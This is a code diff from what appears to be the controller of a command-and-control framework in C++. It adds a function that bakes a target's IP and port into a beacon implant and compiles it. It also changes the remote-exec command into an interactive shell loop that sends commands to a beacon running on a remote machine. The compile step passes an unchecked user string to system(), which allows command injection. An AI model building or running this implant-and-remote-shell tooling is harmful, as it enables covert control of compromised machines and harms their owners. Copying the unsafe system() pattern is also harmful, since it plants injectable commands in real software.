@@ -78,12 +78,6 @@ void add_target(ARGS args) {
     target["name"] = args[0];
     target["ip"] = args[1];
     target["uris"] = json::array();
-    json beacon = {
-        {"alive",false},
-        {"persistent",false},
-        {"port",-1}
-    };
-    target["beacon"] = beacon;
     config["targets"].push_back(target);
     setConfig(config);
     log("success");
@@ -164,7 +158,7 @@ void info(ARGS args){
         std::cerr << "error: target does not exist\n";
         return;
     }
-    std::vector properties = { "id", "name", "ip", "uri", "beacon" };
+    std::vector properties = { "id", "name", "ip", "uris", "beacon" };
     for ( auto &pt : properties) {
         std::string prop = pt;
         std::string propUpper = pt;
@@ -203,6 +197,44 @@ void rm_target(ARGS args){
     log("success");
 }
 
+void compile(ARGS args){
+    if (args.size() != 2){
+        usage_err("compile");
+        return;
+    }
+    json config = getConfig();
+    if (!validTarget(args[0], config["targets"].size())){
+        usage_err("compile");
+        return;
+    }
+    std::string id = args[0];
+    int id_int = std::stoi(id);
+    int port;
+    std::string ip_addr;
+
+    port = config["targets"][id_int]["beacon"]["port"];
+    ip_addr = config["targets"][id_int]["ip"];
+
+    std::string port_str = std::to_string(port);
+
+    std::string id_st = "int beacon_id = " + id + ';';
+    std::string port_st = "int beacon_port = " + port_str + ';';
+    std::string ip_addr_st = "const char *beacon_ip_addr = \"" + ip_addr + "\";";
+    std::ofstream varfile("remote/beacon.vars");
+
+    varfile << id_st << std::endl;
+    varfile << port_st << std::endl;
+    varfile << ip_addr_st << std::endl;
+
+    system("echo \"binary to be saved to $PWD/beacon\"");
+    std::string compiler = args[1];
+    std::string cmdexec = compiler + " remote/*.cpp libs/*.cpp -I include/ -I remote/ -o $PWD/beacon -lreadline";
+    system(cmdexec.c_str());
+    const int result = remove("remote/beacon.vars");
+    if (result != 0)
+        std::cout << "Failed to remove variable file (remote/beacon.vars)\n";
+}
+
 void r_exec(ARGS args){
     if (args.size() != 1){
         usage_err("r-exec");
@@ -215,12 +247,19 @@ void r_exec(ARGS args){
     }
     json upd;
     std::string cmd;
-    std::cout << "Enter command to execute on beacon " << args[0] << ": ";
-    std::getline(std::cin, cmd);
-    std::string k;
-    upd["cmd"] = cmd;
-    std::stringstream ss;
-    ss << upd;
-    k = ss.str();
-    communicate(std::stoi(args[0]), k);
+    std::cout << "enter 'exit' to stop\n";
+    std::string exit{"exit"};
+    while (true){
+        std::cout << "[" << args[0] << " $] ";
+        std::getline(std::cin, cmd);
+        if (cmd == "exit"){
+            return;
+        }
+        std::string k;
+        upd["cmd"] = cmd;
+        std::stringstream ss;
+        ss << upd;
+        k = ss.str();
+        communicate(std::stoi(args[0]), k);
+    }
 }
